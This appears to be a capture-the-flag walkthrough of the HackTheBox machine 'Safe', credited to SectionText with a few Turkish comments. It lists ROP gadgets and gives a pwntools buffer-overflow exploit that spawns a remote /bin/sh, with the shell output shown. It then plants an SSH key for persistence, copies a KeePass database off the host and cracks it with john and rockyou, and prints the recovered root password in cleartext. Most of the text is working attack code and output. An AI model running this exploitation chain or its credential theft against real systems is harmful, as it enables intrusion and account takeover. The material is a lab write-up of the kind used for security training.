0x00000000004010bc: adc edi, dword ptr [rax]; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401099: add ah, dh; nop dword ptr [rax + rax]; ret; 
0x0000000000401093: add bh, bh; adc eax, 0x2f56; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004010be: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401100: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004011a7: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x00000000004011a8: add byte ptr [rax], al; add cl, cl; ret; 
0x0000000000401212: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x1012; call rax; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010c0: add byte ptr [rax], al; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401102: add byte ptr [rax], al; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x0000000000401098: add byte ptr [rax], al; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004011a9: add byte ptr [rax], al; leave; ret; 
0x000000000040109e: add byte ptr [rax], al; ret; 
0x000000000040109d: add byte ptr [rax], r8b; ret; 
0x0000000000401137: add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004011aa: add cl, cl; ret; 
0x0000000000401092: add dil, dil; adc eax, 0x2f56; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x0000000000401013: add esp, 8; ret; 
0x0000000000401012: add rsp, 8; ret; 
0x00000000004011a1: call 0x1030; mov eax, 0; leave; ret; 
0x000000000040112d: call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; 
0x0000000000401094: call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401010: call rax; 
0x0000000000401010: call rax; add rsp, 8; ret; 
0x0000000000401134: comiss xmm0, xmmword ptr [rax]; add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004011f4: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000401002: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x000000000040115b: in eax, 0x90; pop rbp; ret; 
0x000000000040100e: je 0x1012; call rax; 
0x000000000040100e: je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010bb: je 0x10d0; mov eax, 0; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010c5: je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010fd: je 0x1110; mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x0000000000401107: je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004010cc: jmp rax; 
0x000000000040119b: lea eax, dword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040119a: lea rax, qword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x0000000000401132: mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; 
0x00000000004010bd: mov eax, 0; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010ff: mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004011a6: mov eax, 0; leave; ret; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x000000000040112b: mov ebp, esp; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; 
0x0000000000401087: mov ecx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108e: mov edi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010c7: mov edi, 0x404048; jmp rax; 
0x000000000040119f: mov edi, eax; call 0x1030; mov eax, 0; leave; ret; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x000000000040112a: mov rbp, rsp; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; 
0x0000000000401086: mov rcx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108d: mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040119e: mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040109b: nop dword ptr [rax + rax]; ret; 
0x000000000040120d: nop dword ptr [rax]; ret; 
0x0000000000401003: or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
0x0000000000401204: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401206: pop r13; pop r14; pop r15; ret; 
0x0000000000401208: pop r14; pop r15; ret; 
0x000000000040120a: pop r15; ret; 
0x0000000000401203: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401207: pop rbp; pop r14; pop r15; ret; 
0x0000000000401139: pop rbp; ret; 
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040120b: pop rdi; ret; 
0x0000000000401209: pop rsi; pop r15; ret; 
0x0000000000401205: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000401129: push rbp; mov rbp, rsp; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; 
0x000000000040100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x0000000000401215: sub esp, 8; add rsp, 8; ret; 
0x0000000000401001: sub esp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401214: sub rsp, 8; add rsp, 8; ret; 
0x0000000000401000: sub rsp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x000000000040100c: test eax, eax; je 0x1012; call rax; 
0x000000000040100c: test eax, eax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010c3: test eax, eax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401105: test eax, eax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x000000000040100b: test rax, rax; je 0x1012; call rax; 
0x000000000040100b: test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010c2: test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401104: test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x000000000040119c: xchg eax, r8d; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040109a: hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004011ab: leave; ret; 
0x000000000040119d: nop; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040115c: nop; pop rbp; ret; 
0x00000000004010cf: nop; ret; 
0x0000000000401016: ret; 

99 gadgets found
```
##### 0x0000000000401206: pop r13; pop r14; pop r15; ret; 
##### Offset: 0x401206
```python
from pwn import * # library
p = remote("10.10.10.147", 1337) # server port
trash = "A"*112 # 119-7 len(/bin/sh)
system = p64(0x401040) # systemaddr
rpop13 = p64(0x401206) # r13addr
rjmp13 = p64(0x401152) # test addr
shell =  "/bin/sh\x00" # sh
NULL = p64(0x00) # NULL byte
payload = trash + shell + rpop13 + system +  NULL + NULL + rjmp13
p.send(payload) # send
p.interactive() # i/o
```
```python
~/HTB/Safe # python exploit.py                                                                                                                                               
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 14:12:22 up 10:24,  0 users,  load average: 0.00, 0.00, 0.00
$ ls -lsah 
$ ls -lsah
total 84K
4.0K drwxr-xr-x  22 root root 4.0K May 13 08:32 .
4.0K drwxr-xr-x  22 root root 4.0K May 13 08:32 ..
4.0K drwxr-xr-x   2 root root 4.0K May 13 08:33 bin
4.0K drwxr-xr-x   3 root root 4.0K May 13 08:34 boot
   0 drwxr-xr-x  17 root root 3.1K Oct 16 03:48 dev
4.0K drwxr-xr-x  76 root root 4.0K Aug 23 06:17 etc
4.0K drwxr-xr-x   3 root root 4.0K May 13 08:34 home
   0 lrwxrwxrwx   1 root root   29 May 13 08:32 initrd.img -> boot/initrd.img-4.9.0-9-amd64
   0 lrwxrwxrwx   1 root root   29 May 13 08:32 initrd.img.old -> boot/initrd.img-4.9.0-9-amd64
4.0K drwxr-xr-x  14 root root 4.0K May 13 08:33 lib
4.0K drwxr-xr-x   2 root root 4.0K May 13 08:32 lib64
 16K drwx------   2 root root  16K May 13 08:31 lost+found
4.0K drwxr-xr-x   3 root root 4.0K May 13 08:31 media
4.0K drwxr-xr-x   2 root root 4.0K May 13 08:32 mnt
4.0K drwxr-xr-x   2 root root 4.0K May 13 08:32 opt
   0 dr-xr-xr-x 134 root root    0 Oct 16 03:48 proc
4.0K drwx------   3 root root 4.0K Aug 23 06:17 root
   0 drwxr-xr-x  17 root root  540 Oct 16 03:48 run
4.0K drwxr-xr-x   2 root root 4.0K Aug 23 06:17 sbin
4.0K drwxr-xr-x   2 root root 4.0K May 13 08:32 srv
   0 dr-xr-xr-x  13 root root    0 Oct 16 12:18 sys
4.0K drwxrwxrwt  11 root root 4.0K Oct 16 13:17 tmp
4.0K drwxr-xr-x  10 root root 4.0K May 13 08:32 usr
4.0K drwxr-xr-x  12 root root 4.0K May 13 08:33 var
   0 lrwxrwxrwx   1 root root   26 May 13 08:32 vmlinuz -> boot/vmlinuz-4.9.0-9-amd64
   0 lrwxrwxrwx   1 root root   26 May 13 08:32 vmlinuz.old -> boot/vmlinuz-4.9.0-9-amd64
$ wc -c /home/user/user.txt
33 /home/user/user.txt
$ cd /home/user/.ssh
$ ls -lsah
total 8.0K
4.0K drwx------ 2 user user 4.0K May 13 11:18 .
4.0K drwxr-xr-x 3 user user 4.0K May 13 11:18 ..
$  
```
```bash
~ # ssh-keygen                                                                                                                                                                    
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
```
```bash
~ # wc -c .ssh/id_rsa.pub                                                                                                                                                       
569 .ssh/id_rsa.pub
```
##### id_rsa.pub dosyasının içeriğini kopyalayıp, user içerisindeki .ssh dizinine authorized_keys ismi ile yapıştıralım.
```zsh
~/HTB/Safe # ssh user@10.10.10.147                                                                                                                                                
The authenticity of host '10.10.10.147 (10.10.10.147)' can't be established.
ECDSA key fingerprint is SHA256:SLbYsnF/xaUQIxRufe8Ux6dZJ9+Jler9PTISUR90xkc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.147' (ECDSA) to the list of known hosts.
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
user@safe:~$ 
```
```zsh
user@safe:~$ ls
IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt
```
##### scp ile user makinesindeki görselleri ve kdbx dosyasını alalım.
```zsh
~/HTB/Safe # scp user@10.10.10.147:/home/user/IMG_0547.JPG /root/HTB/Safe/img.JPG   
~/HTB/Safe # scp user@10.10.10.147:/home/user/MyPasswords.kdbx /root/HTB/Safe/   
~/HTB/Safe # keepass2john MyPasswords.kdbx -k img.JPG > hash.txt
~/HTB/Safe # john --wordlist=/root/HTB/Safe/rockyou.txt hash.txt                                                                                                                       root@0x67616e67
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)
1g 0:00:00:03 DONE (2019-10-16 21:51) 0.2873g/s 294.2p/s 294.2c/s 294.2C/s andre..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
```zsh
~/HTB # kpcli --kdb MyPasswords.kdbx --key img.JPG                                                                                                                                root@0x67616e67
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> show -f Root\ password 

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL: 
Notes: 

kpcli:/MyPasswords> 
```
```zsh
user@safe:~$ su - 
Password: 
root@safe:~# wc -c /root/root.txt
33 /root/root.txt
root@safe:~# 
```
---
# Author <a href=" https://twitter.com/SectionText">SectionText</a> 
---